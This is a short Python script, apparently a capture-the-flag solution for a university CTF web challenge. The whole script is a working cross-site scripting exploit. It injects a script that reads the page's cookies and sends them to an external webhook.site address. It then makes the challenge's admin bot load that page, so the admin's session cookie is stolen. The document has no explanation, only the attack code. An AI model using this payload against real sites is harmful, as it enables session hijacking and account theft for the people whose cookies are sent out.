#!/usr/bin/env python3
import requests
from urllib.parse import quote

payload = '''<script>document.body.innerHTML+='<img src="x" onerror="fetch(\\'https://webhook.site/f7f16ea9-51f8-4200-853f-12c4aba6d6a7?c='+document.cookie+'\\')">'</script>'''
encoded_input = quote(payload)
target_url = f"https://waynestateuniversity-ctf24-handlebars.chals.io/page/1337?input={encoded_input}"
encoded_target_url = quote(target_url)
adminbot_url = f"https://waynestateuniversity-ctf24-handlebars.chals.io/adminbot?url={encoded_target_url}"


print(f"Sending to: {adminbot_url}")
requests.get(adminbot_url)